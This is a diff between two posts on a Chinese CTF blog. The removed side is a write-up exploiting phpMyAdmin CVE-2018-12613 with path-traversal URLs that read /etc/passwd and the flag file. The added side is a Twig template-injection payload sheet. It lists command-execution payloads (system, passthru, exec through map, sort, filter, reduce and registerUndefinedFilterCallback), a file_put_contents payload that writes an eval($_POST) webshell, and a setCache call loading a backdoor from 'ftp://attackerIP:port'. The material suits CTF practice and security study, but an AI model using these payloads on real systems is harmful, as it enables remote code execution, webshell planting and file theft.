@@ -17,37 +17,28 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="BUUCTF 网址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
+<meta name="description" content="记录一下关于Twig模板注入的知识点以及相关的payload。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GWCTF 2019 我有一个数据库">
-<meta property="og:url" content="https://hdfzzf.github.io/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/index.html">
+<meta property="og:title" content="Twig模板注入">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
-<meta property="og:description" content="BUUCTF 网址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges">
+<meta property="og:description" content="记录一下关于Twig模板注入的知识点以及相关的payload。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png">
-<meta property="article:published_time" content="2022-03-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-24T13:00:45.682Z">
+<meta property="article:published_time" content="2022-04-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-05T02:17:56.120Z">
 <meta property="article:author" content="hdfzzf">
-<meta property="article:tag" content="phpmyadmin 漏洞">
-<meta property="article:tag" content="CVE-2018-12613">
+<meta property="article:tag" content="Twig">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png">
 
 
-<link rel="canonical" href="https://hdfzzf.github.io/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
+<link rel="canonical" href="https://hdfzzf.github.io/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/","path":"2022/03/24/GWCTF 2019 我有一个数据库/","title":"GWCTF 2019 我有一个数据库"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","path":"2022/04/05/Twig模板注入/","title":"Twig模板注入"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>GWCTF 2019 我有一个数据库 | HDFZZF's BLOG</title>
+<title>Twig模板注入 | HDFZZF's BLOG</title>
   
 
 
@@ -154,7 +145,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#twig-1.x"><span class="nav-number">1.</span> <span class="nav-text">Twig 1.x</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#twig-2.x-3.x"><span class="nav-number">2.</span> <span class="nav-text">Twig 2.x &#x2F; 3.x</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#map%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.1.</span> <span class="nav-text">map过滤器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sort%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.2.</span> <span class="nav-text">sort过滤器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.</span> <span class="nav-text">filter过滤器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reduce%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.4.</span> <span class="nav-text">reduce过滤器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E7%99%BD%E5%AB%96"><span class="nav-number">3.</span> <span class="nav-text">参考（白嫖）</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -228,7 +219,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
+    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/zzf.jpg">
@@ -241,7 +232,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          GWCTF 2019 我有一个数据库
+          Twig模板注入
         </h1>
 
         <div class="post-meta-container">
@@ -253,7 +244,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-03-24 00:00 / 修改时间：21:00" itemprop="dateCreated datePublished" datetime="2022-03-24T00:00:00+08:00">2022-03-24</time>
+      <time title="创建时间：2022-04-05 00:00 / 修改时间：10:17" itemprop="dateCreated datePublished" datetime="2022-04-05T00:00:00+08:00">2022-04-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -261,7 +252,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+          <a href="/categories/SSTI/" itemprop="url" rel="index"><span itemprop="name">SSTI</span></a>
         </span>
     </span>
 
@@ -281,8 +272,8 @@
       </span>
       <span class="post-meta-item-text">Disqus：</span>
     
-    <a title="disqus" href="/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/03/24/GWCTF 2019 我有一个数据库/" itemprop="commentCount"></span>
+    <a title="disqus" href="/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/05/Twig模板注入/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -293,14 +284,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>641</span>
+      <span>2.7k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -311,36 +302,35 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+        <p>记录一下关于Twig模板注入的知识点以及相关的payload。</p>
 <span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
-<p>因此，决定扫描目录，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
-<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
-<h1 id="解题">解题</h1>
-<p>通过该页面发现：</p>
+<h1 id="twig-1.x">Twig 1.x</h1>
+<p>在Twig 1.x下，存在全局变量<code>_self</code>，指向的是引用当前模板的实例，代码层面如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> specialVars = [</span><br><span class="line">    <span class="string">&#x27;_self&#x27;</span> =&gt; <span class="string">&#x27;this&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
+<p>可以利用_self变量，返回当前 实例，该实例提供了指向Twig_Environment的env属性，因此，可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。</p>
+<p>比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attackerIP:port&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoorFile&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在SSTI的应用中，主要是因为<code>getFilter</code>函数中存在危险函数<code>call_user_func</code> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 第一个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">foreach</span> (this-&gt;filterCallbacks <span class="keyword">as</span> callback) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (<span class="literal">false</span> !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">			<span class="keyword">return</span> filter;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 第二个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="keyword">callable</span></span>)</span>&#123;</span><br><span class="line">	this-&gt;filterCallbacks[] =<span class="keyword">callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>简单解释一下代码（不是很懂PHP）</strong>：</p>
+<p><code>getFilter</code>函数可以将<code>this-&gt;filterCallbacks</code>数组中的元素当作PHP函数的名称而调用，<code>name</code>就是PHP函数的参数。</p>
+<p>而<code>registerUndefinedFilterCallback</code>函数可以设置<code>this-&gt;filterCallbacks</code>数组，因此，思路就是先通过第二个函数设置我们要执行的函数，比如说<code>exec</code>，然后通过第一个函数调用这个函数，并由<code>name</code>传入函数执行所必要的参数。</p>
+<p>因此，构造如下payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这句话就类似在Linux系统中的shell直接执行命令<code>id</code>。</p>
+<p>在Twig 2.x/3.x中<code>_self</code>的作用发生变化，此payload不能继续使用。</p>
+<p>例题：[[BJDCTF20Cookie is so stable]]</p>
+<h1 id="twig-2.x-3.x">Twig 2.x / 3.x</h1>
+<h2 id="map过滤器">map过滤器</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]|map(<span class="string">&quot;assert&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval(<span class="subst">$_POST</span>[shell])&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;    <span class="comment">// 写 Webshell</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="sort过滤器">sort过滤器</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h2 id="filter过滤器">filter过滤器</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h2 id="reduce过滤器">reduce过滤器</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h1 id="参考白嫖">参考（白嫖）</h1>
 <ol type="1">
-<li><p>phpmyadmin 版本为 4.8.1</p></li>
-<li><p>服务器用的是 apache</p></li>
-<li><p>数据库是 mysql</p></li>
-<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
-<li><p>系统为 Ubuntu</p></li>
+<li>http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/</li>
+<li>https://xz.aliyun.com/t/10056#toc-16</li>
 </ol>
-<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
-<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
-<p>得到 flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
 
     </div>
 
@@ -350,21 +340,20 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/phpmyadmin-%E6%BC%8F%E6%B4%9E/" rel="tag"># phpmyadmin 漏洞</a>
-              <a href="/tags/CVE-2018-12613/" rel="tag"># CVE-2018-12613</a>
+              <a href="/tags/Twig/" rel="tag"># Twig</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/" rel="prev" title="复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）">
-                  <i class="fa fa-chevron-left"></i> 复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）
+                <a href="/2022/04/03/%E7%AC%AC4%E5%91%A8%EF%BC%9AVulnhub%20AdmX%20writeup/" rel="prev" title="第4周：Vulnhub AdmX writeup">
+                  <i class="fa fa-chevron-left"></i> 第4周：Vulnhub AdmX writeup
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" rel="next" title="GXYCTF2019 禁止套娃">
-                  GXYCTF2019 禁止套娃 <i class="fa fa-chevron-right"></i>
+                <a href="/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/" rel="next" title="BJDCTF20 Cookie is so stable">
+                  BJDCTF20 Cookie is so stable <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
